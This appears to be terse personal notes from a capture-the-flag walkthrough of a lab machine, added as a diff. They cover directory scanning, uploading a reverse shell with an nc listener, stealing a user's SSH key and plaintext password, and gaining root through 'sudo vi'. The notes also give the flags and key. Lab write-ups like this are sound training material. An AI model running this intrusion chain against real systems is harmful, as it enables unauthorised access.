@@ -1,0 +1,60 @@
+date:mar/30/2021
+time:12:42
+
+└─$ ./dirsearch.py -u 10.10.110.121 
+http://10.10.110.121/home.php
+up load reverse shell by pentestmonkey
+nc -lnvp 4444
+boom!!
+
+cd /home/charlie
+cat teleport
+copy and paste in id_rsa
+chmod 400 id_rsa 
+cd /var/www/html
+cat key_rev_key
+congratulations you have found the key:   b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
+cat vlaidate.php
+if($uname=="charlie" && $password=="cn7824"){
+└─$ ssh -i id_rsa charlie@10.10.110.121 
+
+charlie@chocolate-factory:/home/charlie$ cat user.txt
+flag{cd5509042371b34e4826e4838b522d2e}
+sudo -l
+search gtfobin vi > sudo 
+charlie@chocolate-factory:/home/charlie$ sudo vi -c ':!/bin/sh' /dev/null
+
+# whoami
+root
+# cd /root
+# ls
+
+# python root.py
+Enter the key:  b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
+__   __               _               _   _                 _____ _          
+\ \ / /__  _   _     / \   _ __ ___  | \ | | _____      __ |_   _| |__   ___ 
+ \ V / _ \| | | |   / _ \ | '__/ _ \ |  \| |/ _ \ \ /\ / /   | | | '_ \ / _ \
+  | | (_) | |_| |  / ___ \| | |  __/ | |\  | (_) \ V  V /    | | | | | |  __/
+  |_|\___/ \__,_| /_/   \_\_|  \___| |_| \_|\___/ \_/\_/     |_| |_| |_|\___|
+                                                                             
+  ___                              ___   __  
+ / _ \__      ___ __   ___ _ __   / _ \ / _| 
+| | | \ \ /\ / / '_ \ / _ \ '__| | | | | |_  
+| |_| |\ V  V /| | | |  __/ |    | |_| |  _| 
+ \___/  \_/\_/ |_| |_|\___|_|     \___/|_|   
+                                             
+
+  ____ _                     _       _       
+ / ___| |__   ___   ___ ___ | | __ _| |_ ___ 
+| |   | '_ \ / _ \ / __/ _ \| |/ _` | __/ _ \
+| |___| | | | (_) | (_| (_) | | (_| | ||  __/
+ \____|_| |_|\___/ \___\___/|_|\__,_|\__\___|
+                                             
+ _____          _                    
+|  ___|_ _  ___| |_ ___  _ __ _   _  
+| |_ / _` |/ __| __/ _ \| '__| | | | 
+|  _| (_| | (__| || (_) | |  | |_| | 
+|_|  \__,_|\___|\__\___/|_|   \__, | 
+                              |___/  
+
+flag{cec59161d338fef787fcb4e296b42124}
